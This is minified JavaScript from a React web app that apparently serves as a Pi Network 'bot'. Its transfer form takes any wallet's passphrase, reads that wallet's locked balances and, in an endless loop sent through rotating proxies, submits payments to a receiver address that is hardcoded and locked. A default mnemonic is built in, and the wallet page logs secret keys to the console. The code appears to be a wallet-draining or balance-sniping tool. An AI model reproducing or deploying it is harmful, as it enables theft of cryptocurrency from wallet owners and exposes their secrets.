            const ye = typeof this.proxyHeaders == "function" ? this.proxyHeaders() : {
                ...this.proxyHeaders
            }
              , be = x.isIPv6(fe.host) ? `[${fe.host}]` : fe.host;
            let xe = `CONNECT ${be}:${fe.port} HTTP/1.1\r
`;
            if (he.username || he.password) {
                const q = `${decodeURIComponent(he.username)}:${decodeURIComponent(he.password)}`;
                ye["Proxy-Authorization"] = `Basic ${Buffer.from(q).toString("base64")}`
            }
            ye.Host = `${be}:${fe.port}`,
            ye["Proxy-Connection"] || (ye["Proxy-Connection"] = this.keepAlive ? "Keep-Alive" : "close");
            for (const q of Object.keys(ye))
                xe += `${q}: ${ye[q]}\r
`;
            const Ae = (0,
            V.parseProxyResponse)(pe);
            pe.write(`${xe}\r
`);
            const {connect: Ee, buffered: Be} = await Ae;
            if (ue.emit("proxyConnect", Ee),
            this.emit("proxyConnect", Ee, ue),
            Ee.statusCode === 200)
                return ue.once("socket", ae),
                fe.secureEndpoint ? (K("Upgrading socket connection to TLS"),
                w.connect({
                    ...ne(Q(fe), "host", "path", "port"),
                    socket: pe
                })) : pe;
            pe.destroy();
            const ce = new x.Socket({
                writable: !1
            });
            return ce.readable = !0,
            ue.once("socket", q => {
                K("Replaying proxy buffer for failed request"),
                (0,
                b.default)(q.listenerCount("data") > 0),
                q.push(Be),
                q.push(null)
            }
            ),
            ce
        }
    }
    ee.protocols = ["http", "https"],
    dist$1.HttpsProxyAgent = ee;
    function ae(oe) {
        oe.resume()
    }
    function ne(oe, ...ue) {
        const fe = {};
        let he;
        for (he in oe)
            ue.includes(he) || (fe[he] = oe[he]);
        return fe
    }
    return dist$1
}
var distExports = requireDist();
const HORIZON_URL = "http://4.194.35.14:31401"
  , NETWORK_PASSPHRASE = "Pi Network"
  , BASE_FEE = "100000"
  , CHANNEL_SECRETS = []
  , PROXY_LIST = ["http://user:pass@proxy1.oxylabs.io:60000", "http://user:pass@proxy2.oxylabs.io:60001"];
function getAxiosWithProxy() {
    const _ = PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
    return axios.create({
        baseURL: HORIZON_URL,
        timeout: 1e4,
        httpsAgent: new distExports.HttpsProxyAgent(_)
    })
}
async function buildSignedXDR(_, M, j, O) {
    const w = await getAxiosWithProxy().get(`/accounts/${M.publicKey()}`)
      , b = new libExports.Account(M.publicKey(),w.data.sequence)
      , X = new libExports.TransactionBuilder(b,{
        fee: BASE_FEE,
        networkPassphrase: NETWORK_PASSPHRASE
    }).addOperation(libExports.Operation.payment({
        destination: j,
        asset: libExports.Asset.native(),
        amount: O,
        source: _.publicKey()
    })).setTimeout(30).build();
    return X.sign(_),
    X.sign(M),
    X.toXDR()
}
async function submitXDR(_) {
    var j;
    const M = getAxiosWithProxy();
    try {
        const O = await M.post("/transactions", `tx=${encodeURIComponent(_)}`, {
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            }
        });
        return console.log(" Success:", O.data.hash),
        O
    } catch (O) {
        console.error(" Failed:", ((j = O.response) == null ? void 0 : j.data) || O.message)
    }
}
const channelKeypairs = CHANNEL_SECRETS.map(_ => libExports.Keypair.fromSecret(_))
  , TransferV2 = () => {
    const [_,M] = reactExports.useState(!1)
      , [j,O] = reactExports.useState("test craft arrive help thing pencil onion jazz summer leaf alcohol pizza nothing joke dragon arrive laundry smart survey entry edge now license name")
      , [x,w] = reactExports.useState("GA2CXP2KK2PANC3JDEZLRKONYZBWXMTHY3N235QNJQFGGTJRUMPNM75X")
      , [b,X] = reactExports.useState([])
      , [Y,F] = reactExports.useState(null)
      , [V,K] = reactExports.useState(!1)
      , [Q,ee] = reactExports.useState();
    reactExports.useEffect( () => {
        ae(j)
    }
    , [j]);
    async function ae(oe) {
        const ue = generateStellaBaseKeypair(oe);
        ee(ue);
        const he = (await getClaimableBalance(ue.publicKey())).records.map(pe => {
            var ye;
            return {
                id: pe.id,
                amount: pe.amount,
                abs_before: (ye = pe.claimants[0].predicate.not) == null ? void 0 : ye.abs_before
            }
        }
        );
        X(he)
    }
    async function ne() {
        if (Q) {
            for (K(!0); ; ) {
                await ae(j);
                const oe = b.find(ue => ue.id === Y);
                oe && Y && await Promise.all(channelKeypairs.map(async ue => {
                    const fe = await buildSignedXDR(Q, ue, x, oe.amount)
                      , he = submitXDR(fe);
                    console.log(he)
                }
                ))
            }
            K(!1)
        }
    }
    return jsxRuntimeExports.jsxs("div", {
        className: "flex flex-col gap-7 justify-start w-full px-2",
        children: [jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            children: [jsxRuntimeExports.jsx(p$8, {
                className: "text-base md:text-2xl font-semibold text-gray-300",
                children: "Transfer Coins"
            }), jsxRuntimeExports.jsx(p$8, {
                className: "md:text-sm text-xs font-medium text-gray-500",
                children: "Fill in the below form correctly"
            })]
        }), jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            gap: "1",
            children: [jsxRuntimeExports.jsx(y$1, {
                className: "font-medium text-base !text-gray-100",
                children: "Sender Wallet Passphrase"
            }), jsxRuntimeExports.jsx(u, {
                type: _ ? "text" : "password",
                value: j,
                onChange: oe => O(oe.currentTarget.value),
                placeholder: "Enter sender wallet passphrase...",
                className: "flex items-center justify-between !bg-transparent !text-gray-300 placeholder:!text-gray-400 border-2 border-gray-300 focus:outline-0 focus:ring-0 custom-input w-full",
                size: "3",
                children: jsxRuntimeExports.jsx(c, {
                    side: "right",
                    children: jsxRuntimeExports.jsx(o$2, {
                        onClick: () => M(!_),
                        size: "2",
                        variant: "ghost",
                        children: jsxRuntimeExports.jsx(FaEye, {
                            height: "16",
                            width: "16",
                            className: "text-gray-50"
                        })
                    })
                })
            }), j && Q && jsxRuntimeExports.jsxs("div", {
                className: "flex items-center gap-2",
                children: [jsxRuntimeExports.jsx(FaCheckCircle, {
                    className: "text-xs text-blue-600"
                }), jsxRuntimeExports.jsx("p", {
                    className: "text-xs text-blue-600 font-medium",
                    children: `${Q == null ? void 0 : Q.publicKey().slice(0, 10)}...${Q == null ? void 0 : Q.publicKey().slice(-10)}`
                })]
            })]
        }), jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            gap: "1",
            children: [jsxRuntimeExports.jsx(y$1, {
                className: "font-medium text-base !text-gray-100",
                children: "Receiver wallet address"
            }), jsxRuntimeExports.jsx(u, {
                disabled: !0,
                type: "text",
                value: x,
                onChange: oe => w(oe.currentTarget.value),
                placeholder: "Enter receiver wallet address...",
                className: "flex items-center justify-between !bg-transparent !text-gray-300 placeholder:!text-gray-400 border-2 border-gray-300 focus:outline-0 focus:ring-0 custom-input w-full cursor-not-allowed",
                size: "3"
            })]
        }), jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            gap: "1",
            children: [jsxRuntimeExports.jsx(y$1, {
                className: "font-medium text-base !text-gray-100",
                children: "Locked Balances"
            }), jsxRuntimeExports.jsxs(C, {
                value: Y ?? "",
                onValueChange: F,
                children: [jsxRuntimeExports.jsx(u$1, {
                    className: "bg-transparent",
                    placeholder: "Select locked balance"
                }), jsxRuntimeExports.jsx(g, {
                    className: "bg-transparent",
                    children: b.map( (oe, ue) => jsxRuntimeExports.jsx(v, {
                        className: "font-semibold",
                        value: oe.id,
                        children: `Balance #${ue + 1} - ${oe.amount} PI`
                    }, oe.id))
                })]
            })]
        }), jsxRuntimeExports.jsx(o$4, {
            loading: V,
            onClick: ne,
            type: "button",
            className: "!bg-emerald-600",
            children: "Transfer Pi"
        }), jsxRuntimeExports.jsx(jsxRuntimeExports.Fragment, {
            children: jsxRuntimeExports.jsx("style", {
                children: `
                    .rt-TextFieldInput::placeholder {
                        color: gray;
                        opacity: 1; /* for Firefox */
                    }
                        input:disabled {
                            background: #121e31;
                            color: white;
                            cursor: not-allowed;
                        }
                    `
            })
        })]
    })
}
  , Pibotv2 = () => jsxRuntimeExports.jsx("main", {
    className: "min-h-full w-full bg-slate-900 text-slate-50 flex justify-center items-center flex-col gap-2 p-2",
    children: jsxRuntimeExports.jsxs("div", {
        className: "w-full h-full md:w-1/2 flex flex-col justify-center items-center border md:min-h-96 border-slate-700 md:rounded-xl p-2 gap-4",
        children: [jsxRuntimeExports.jsx(BotHeader, {}), jsxRuntimeExports.jsx(o, {
            className: "border-b border-b-gray-800",
            my: "3",
            size: "4"
        }), jsxRuntimeExports.jsx(TransferV2, {})]
    })
})
  , GenerateNewWallet = () => {
    const [_,M] = reactExports.useState(!1)
      , [j,O] = reactExports.useState("")
      , [x,w] = reactExports.useState("")
      , [b,X] = reactExports.useState("")
      , [Y,F] = reactExports.useState("")
      , [V,K] = reactExports.useState(!1)
      , [Q,ee] = reactExports.useState()
      , ae = new libExports$1.Server("http://4.194.35.14:31401");
    reactExports.useEffect( () => {
        const ue = generateWalletKeypair(j);
        ee(ue)
    }
    , [j]);
    async function ne() {
        const ue = libExports$1.Keypair.random();
        w(ue.publicKey()),
        Q && (X(Q.secret()),
        console.log(Q.publicKey()),
        console.log(`Secret: ${Q.secret()}`)),
        K(!0),
        K(!1)
    }
    async function oe() {
        K(!0);
        try {
            if (Q) {
                const ue = await ae.loadAccount(Q.publicKey())
                  , fe = new libExports$1.TransactionBuilder(ue,{
                    fee: "100000",
                    networkPassphrase: NETWORK_PASSPHRASE
                }).addOperation(libExports$1.Operation.createAccount({
                    destination: x,
                    startingBalance: Y
                })).setTimeout(30).build();
                fe.sign(Q),
                await ae.submitTransaction(fe)
            }
        } catch (ue) {
            console.log(ue.response)
        }
        K(!0)
    }
    return jsxRuntimeExports.jsxs("div", {
        className: "flex flex-col gap-7 justify-start w-full px-2",
        children: [jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            children: [jsxRuntimeExports.jsx(p$8, {
                className: "text-base md:text-2xl font-semibold text-gray-300",
                children: "Transfer Coins"
            }), jsxRuntimeExports.jsx(p$8, {
                className: "md:text-sm text-xs font-medium text-gray-500",
                children: "Fill in the below form correctly"
            })]
        }), jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            gap: "1",
            children: [jsxRuntimeExports.jsx(y$1, {
                className: "font-medium text-base !text-gray-100",
                children: "Sender Wallet Passphrase"
            }), jsxRuntimeExports.jsx(u, {
                type: _ ? "text" : "password",
                value: j,
                onChange: ue => O(ue.currentTarget.value),
                placeholder: "Enter sender wallet passphrase...",
                className: "flex items-center justify-between !bg-transparent !text-gray-300 placeholder:!text-gray-400 border-2 border-gray-300 focus:outline-0 focus:ring-0 custom-input w-full",
                size: "3",
                children: jsxRuntimeExports.jsx(c, {
                    side: "right",
                    children: jsxRuntimeExports.jsx(o$2, {
                        onClick: () => M(!_),
                        size: "2",
                        variant: "ghost",
                        children: jsxRuntimeExports.jsx(FaEye, {
                            height: "16",
                            width: "16",
                            className: "text-gray-50"
                        })
                    })
                })
            }), j && Q && jsxRuntimeExports.jsxs("div", {
                className: "flex items-center gap-2",
                children: [jsxRuntimeExports.jsx(FaCheckCircle, {
                    className: "text-xs text-blue-600"
                }), jsxRuntimeExports.jsx("p", {
                    className: "text-xs text-blue-600 font-medium",
                    children: `${Q == null ? void 0 : Q.publicKey().slice(0, 10)}...${Q == null ? void 0 : Q.publicKey().slice(-10)}`
                })]
            })]
        }), x && jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            gap: "1",
            children: [jsxRuntimeExports.jsx(y$1, {
                className: "font-medium text-base !text-gray-100",
                children: "New Wallet Address"
            }), jsxRuntimeExports.jsx(u, {
                type: "text",
                value: x,
                onChange: ue => w(ue.currentTarget.value),
                placeholder: "Enter sender wallet passphrase...",
                className: "flex items-center justify-between !bg-transparent !text-gray-300 placeholder:!text-gray-400 border-2 border-gray-300 focus:outline-0 focus:ring-0 custom-input w-full ",
                size: "3"
            })]
        }), b && jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            gap: "1",
            children: [jsxRuntimeExports.jsx(y$1, {
                className: "font-medium text-base !text-gray-100",
                children: "New Wallet Secret"
            }), jsxRuntimeExports.jsx(u, {
                type: "text",
                value: b,
                onChange: ue => X(ue.currentTarget.value),
                placeholder: "Enter sender wallet passphrase...",
                className: "flex items-center justify-between !bg-transparent !text-gray-300 placeholder:!text-gray-400 border-2 border-gray-300 focus:outline-0 focus:ring-0 custom-input w-full ",
                size: "3"
            })]
        }), b && x && jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            gap: "1",
            children: [jsxRuntimeExports.jsx(y$1, {
                className: "font-medium text-base !text-gray-100",
                children: "Amount To Fund"
            }), jsxRuntimeExports.jsx(u, {
                type: "text",
                value: Y,
                onChange: ue => F(ue.currentTarget.value),
                placeholder: "Enter sender wallet passphrase...",
                className: "flex items-center justify-between !bg-transparent !text-gray-300 placeholder:!text-gray-400 border-2 border-gray-300 focus:outline-0 focus:ring-0 custom-input w-full ",
                size: "3"
            })]
        }), b && x ? jsxRuntimeExports.jsx(o$4, {
            loading: V,
            onClick: oe,
            type: "button",
            className: "!bg-emerald-600",
            children: "Fund"
        }) : jsxRuntimeExports.jsx(o$4, {
            loading: V,
            onClick: ne,
            type: "button",
            className: "!bg-emerald-600",
            children: "Generate Wallet"
        }), jsxRuntimeExports.jsx(jsxRuntimeExports.Fragment, {
            children: jsxRuntimeExports.jsx("style", {
                children: `
                    .rt-TextFieldInput::placeholder {
                        color: gray;
                        opacity: 1; /* for Firefox */
                    }
                        input:disabled {
                            background: #121e31;
                            color: white;
                            cursor: not-allowed;
                        }
                    `
            })
        })]
    })
}
  , CreateWallet = () => jsxRuntimeExports.jsx("main", {
    className: "min-h-full w-full bg-slate-900 text-slate-50 flex justify-center items-center flex-col gap-2 p-2",
    children: jsxRuntimeExports.jsxs("div", {
        className: "w-full h-full md:w-1/2 flex flex-col justify-center items-center border md:min-h-96 border-slate-700 md:rounded-xl p-2 gap-4",
        children: [jsxRuntimeExports.jsx(BotHeader, {}), jsxRuntimeExports.jsx(o, {
            className: "border-b border-b-gray-800",
            my: "3",
            size: "4"
        }), jsxRuntimeExports.jsx(GenerateNewWallet, {})]
    })
});
window.Buffer = Buffer$1;
clientExports.createRoot(document.getElementById("root")).render(jsxRuntimeExports.jsx(reactExports.StrictMode, {
    children: jsxRuntimeExports.jsx(R$1, {
        className: "h-full",
        children: jsxRuntimeExports.jsx(BrowserRouter, {
            children: jsxRuntimeExports.jsxs(Routes, {
                children: [jsxRuntimeExports.jsx(Route, {
                    path: "/",
                    element: jsxRuntimeExports.jsx(Home, {})
                }), jsxRuntimeExports.jsx(Route, {
                    path: "/tmp",
                    element: jsxRuntimeExports.jsx(ReceiverPay, {})
                }), jsxRuntimeExports.jsx(Route, {
                    path: "/v2",
                    element: jsxRuntimeExports.jsx(Pibotv2, {})
                }), jsxRuntimeExports.jsx(Route, {
                    path: "/wallet",
                    element: jsxRuntimeExports.jsx(CreateWallet, {})
                })]
            })
        })
    })
}));
